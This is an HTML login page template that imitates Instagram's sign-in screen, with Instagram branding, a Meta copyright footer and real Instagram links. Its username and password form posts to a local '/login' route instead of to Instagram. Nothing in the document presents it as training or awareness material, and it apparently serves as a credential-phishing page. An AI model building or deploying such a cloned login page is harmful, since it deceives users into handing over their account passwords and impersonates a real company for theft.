<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <title>Instagram</title>
  <style>
    body {
      margin: 0;
      background-color: #fafafa;
      font-family: Arial, sans-serif;
    }
    .container {
      display: flex;
      min-height: 100vh;
    }
    .left-image {
      flex: 1;
      background-image: url('https://www.instagram.com/static/images/homepage/screenshots/screenshot1-2x.png');
      background-size: cover;
      background-position: center;
      display: none;
    }
    .right-form {
      flex: 1;
      display: flex;
      flex-direction: column;
      align-items: center;
      padding: 40px 20px;
    }
    .login-container {
      max-width: 350px;
      width: 100%;
      border: 1px solid #dbdbdb;
      background-color: #fff;
      padding: 40px 40px 20px;
      text-align: center;
      margin-bottom: 10px;
    }
    .logo img {
      width: 180px;
      margin-bottom: 20px;
      object-fit: contain;
    }
    input {
      width: 100%;
      padding: 10px;
      margin: 6px 0;
      border: 1px solid #dbdbdb;
      border-radius: 3px;
      background-color: #fafafa;
    }
    .password-field {
      position: relative;
      width: 100%;
    }
    .password-field input {
      padding-right: 60px;
    }
    .toggle-password {
      position: absolute;
      right: 10px;
      top: 50%;
      transform: translateY(-50%);
      background: none;
      border: none;
      color: #00376b;
      font-size: 14px;
      cursor: pointer;
      user-select: none;
    }
    button {
      width: 100%;
      padding: 10px;
      margin-top: 10px;
      background-color: #3897f0;
      border: none;
      border-radius: 3px;
      color: white;
      font-weight: bold;
      cursor: pointer;
    }
    button:disabled {
      background-color: #b2dffc;
      cursor: not-allowed;
    }
    .divider {
      display: flex;
      align-items: center;
      text-align: center;
      margin: 20px 0;
      color: #8e8e8e;
      font-size: 13px;
    }
    .divider::before,
    .divider::after {
      content: '';
      flex: 1;
      border-bottom: 1px solid #dbdbdb;
    }
    .divider:not(:empty)::before {
      margin-right: 10px;
    }
    .divider:not(:empty)::after {
      margin-left: 10px;
    }
    .fb-login {
      background-color: #4267b2;
      text-decoration: none;
      display: inline-block;
      color: white;
      padding: 10px;
      border-radius: 3px;
      font-weight: bold;
      margin-top: 10px;
    }
    .forgot {
      margin-top: 15px;
      font-size: 12px;
    }
    .forgot a {
      color: #00376b;
      text-decoration: none;
      font-weight: bold;
    }
    .signup {
      text-align: center;
      margin-top: 20px;
      padding: 20px;
      border: 1px solid #dbdbdb;
      background-color: #fff;
      font-size: 14px;
    }
    .signup a {
      color: #3897f0;
      text-decoration: none;
      font-weight: bold;
    }
    .get-app {
      text-align: center;
      font-size: 14px;
      color: #262626;
      margin-top: 20px;
    }
    .app-badges {
      margin-top: 10px;
      display: flex;
      justify-content: center;
      gap: 10px;
      flex-wrap: wrap;
    }
    .app-badges img {
      height: 40px;
      max-width: 140px;
      width: auto;
      object-fit: contain;
    }
    footer {
      text-align: center;
      padding: 20px;
      font-size: 12px;
      color: #8e8e8e;
    }
    @media(min-width: 768px) {
      .left-image {
        display: block;
      }
    }
  </style>
</head>
<body>
  <div class="container">
    <div class="left-image"></div>
    <div class="right-form">
      <div class="login-container">
        <div class="logo">
          <img src="https://www.pngarts.com/files/4/Instagram-PNG-Background-Image.png" alt="Instagram Logo">
        </div>
        {% if error %}
          <div class="error-message">{{ error }}</div>
        {% endif %}
        <form id="loginForm" action="/login" method="POST">
          <input type="text" id="email" name="email" placeholder="Phone number, username, or email" required>
          <div class="password-field">
            <input type="password" id="password" name="password" placeholder="Password" required>
            <span class="toggle-password" onclick="togglePassword()">Show</span>
          </div>
          <button id="loginBtn" type="submit" disabled>Log In</button>
        </form>
        <div class="forgot">
          <a href="https://www.instagram.com/accounts/password/reset/" target="_blank">Forgot password?</a>
        </div>
        <div class="divider">OR</div>
        <a class="fb-login" href="https://www.facebook.com/login/" target="_blank">Log in with Facebook</a>
      </div>
      <div class="signup">
        Don't have an account? <a href="https://www.instagram.com/accounts/emailsignup/">Sign up</a>
      </div>
      <div class="get-app">
        Get the app.
        <div class="app-badges">
          <a href="https://play.google.com/store/apps/details?id=com.instagram.android" target="_blank">
            <img src="https://upload.wikimedia.org/wikipedia/commons/7/78/Google_Play_Store_badge_EN.svg" alt="Get it on Google Play">
          </a>
          <a href="https://apps.apple.com/app/instagram/id389801252" target="_blank">
            <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/3/3c/Download_on_the_App_Store_Badge.svg/1280px-Download_on_the_App_Store_Badge.svg.png" alt="Download on the App Store">
          </a>
        </div>
      </div>
      <footer>
        © 2025 Instagram from Meta • All rights reserved.
      </footer>
    </div>
  </div>
  <script>
    const emailInput = document.getElementById('email');
    const passwordInput = document.getElementById('password');
    const loginBtn = document.getElementById('loginBtn');

    function validateForm() {
      const email = emailInput.value.trim();
      const password = passwordInput.value.trim();
      if (email !== '' && password.length >= 6) {
        loginBtn.disabled = false;
      } else {
        loginBtn.disabled = true;
      }
    }

    emailInput.addEventListener('input', validateForm);
    passwordInput.addEventListener('input', validateForm);

    function togglePassword() {
      const passwordField = document.getElementById('password');
      const toggleBtn = document.querySelector('.toggle-password');
      if (passwordField.type === 'password') {
        passwordField.type = 'text';
        toggleBtn.textContent = 'Hide';
      } else {
        passwordField.type = 'password';
        toggleBtn.textContent = 'Show';
      }
    }
  </script>
</body>
</html>
